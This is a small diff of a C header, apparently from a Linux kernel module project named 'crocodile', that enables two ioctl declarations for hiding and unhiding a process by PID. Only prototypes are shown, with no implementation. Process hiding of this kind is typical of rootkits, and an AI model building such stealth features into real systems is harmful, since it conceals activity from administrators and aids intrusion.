@@ -21,9 +21,9 @@
 
 #include "types.h"
 
-//int ioc_hide_proc(module_dev_t* p_dev, pid_t pid);
+int ioc_hide_proc(module_dev_t* p_dev, pid_t pid);
 
-//int ioc_show_proc(module_dev_t* p_dev, pid_t pid);
+int ioc_show_proc(module_dev_t* p_dev, pid_t pid);
 
 #endif /* _CROCODILE_LKM_CTRL_IOCTL_PROC_H_ */
 
